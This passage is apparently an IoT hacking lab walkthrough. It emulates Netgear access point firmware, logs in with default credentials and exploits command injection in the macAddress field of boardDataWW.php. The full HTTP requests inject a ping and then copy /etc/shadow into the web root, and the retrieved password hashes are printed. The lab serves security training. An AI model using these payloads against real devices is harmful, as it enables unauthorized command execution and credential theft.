[hostapd_tr]

Starting Translator...      [nmbd_tr]

Starting Translator...      sh: cannot create /proc/sys/net/bridge/bridge-http-redirect-flush-mac: nonexistent directory
sh: cannot create /proc/sys/net/bridge/bridge-http-redirect-enabled: nonexistent directory
[http_redirect_tr]

Starting Translator...      [dhcp]

Starting Translator...      kill: cannot kill pid 634: No such process
[ntp]

Starting Translator...      [timezone]

Starting Translator...      [sc_radio]
kill: cannot kill pid 647: No such process
Error in opening the device.
: No such device

System initilization is ..  [DONE...]


Welcome to SDK.

Have a lot of fun...

netgear123456 login: [   24.576000] brtrunk: port 1(eth0) entering forwarding state
[   29.916000] eth0: no IPv6 routers present
[   29.952000] brtrunk: no IPv6 routers present


Welcome to SDK.

Have a lot of fun...

netgear123456 login: root	
Password: 
main-loop: WARNING: I/O thread spun for 1000 iterations

[root@netgear123456 /root]# id && hostname
uid=0(root) gid=0(root)
netgear123456

```

Take note to the IP that is outputted (usually is 192.168.0.100) and press enter to continue the emulation.  

Once the emulation is done, create a port forward on your machine (the attacker machine) using SSH as follows:

```bash
fesal@kali:~# ssh -N iot@10.10.150.11 -L 8081:192.168.0.100:80
iot@10.10.150.11's password:
```

Now, if you access [http://localhost:8081](http://localhost:8081) you should be able to access the web application login page (it's a NetGear AP).

The default credentials are **admin:password**.

Once logged in, change the url to [http://localhost:8081/boardDataWW.php](http://localhost:8081/boardDataWW.php). In the MAC Address field add some junk data, for example I added 998877665544, submit it, intercept it using BurpSuite and forward it to the Repeater.

For the PoC I pinged the localhost:
```bash
POST /boardDataWW.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8081/boardDataWW.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
DNT: 1
Connection: close
Cookie: PHPSESSID=7162c54a62699b5dfb327461fe8f9710
Upgrade-Insecure-Requests: 1

macAddress=998877665544;ping+-c+10+127.0.0.1+#&reginfo=0&writeData=Submit
```

You'll notice a delay, which means the application is vulnerable to Command Execution. Let's copy the shadow file:
```bash
POST /boardDataWW.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8081/boardDataWW.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
DNT: 1
Connection: close
Cookie: PHPSESSID=7162c54a62699b5dfb327461fe8f9710
Upgrade-Insecure-Requests: 1

macAddress=998877665544;cp+/etc/shadow+.+#&reginfo=0&writeData=Submit
```
Let's request the shadow file:

```bash
fesal@kali:~# curl http://localhost:8081/shadow          
root:$1$w3gB6MCu$F7n/OBgTalHP0u5O82RhV0:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
admin:$1$x1GxPahw$/XD/2CcBwLurY1./Du7x21:10933:0:99999:7:::
```

Congrats, you have successfully attacked your first IoT system.
